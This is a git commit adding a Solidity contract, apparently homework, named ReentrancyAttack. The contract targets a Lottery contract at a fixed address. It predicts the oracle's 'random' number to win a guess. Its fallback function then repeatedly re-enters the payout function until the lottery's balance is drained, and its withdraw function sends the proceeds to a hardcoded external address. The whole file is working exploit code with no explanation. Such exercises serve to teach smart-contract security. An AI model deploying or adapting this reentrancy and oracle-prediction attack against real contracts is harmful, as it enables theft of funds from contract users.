7f9203ef166aad7d66bdc183cacb15cbe1493795
Samar4eg <81931426+Samar4eg@users.noreply.github.com>
2022-11-27 00:52:23 +0000

    Create attack.sol

---
+++ homework15/attack.sol
@@ -0,0 +1,35 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.6.0;
+
+import "./Lottery.sol";
+import "./Oracle.sol";
+
+contract ReentrancyAttack {
+
+    Lottery lotteryContract;
+    Oracle oracleContract;
+    
+    constructor() public {
+        lotteryContract = Lottery(0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8);
+        oracleContract = Oracle(0xd9145CCE52D386f254917e481eB44e9943F39138);
+    }
+
+    fallback() external payable {
+    if (address(lotteryContract).balance >= 1 gwei){
+        lotteryContract.payoutWinningTeam(address(this));
+        }
+    }
+
+    function drain() public payable {
+        lotteryContract.makeAGuess(address(this), oracleContract.getRandomNumber() );
+        lotteryContract.payoutWinningTeam(address(this));
+    }
+ 
+    function withdraw() public {
+        (bool sent,) = address(0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db).call.value(address(this).balance)("");
+        require(sent);
+    }
+
+    function deposit() public payable {}
+}
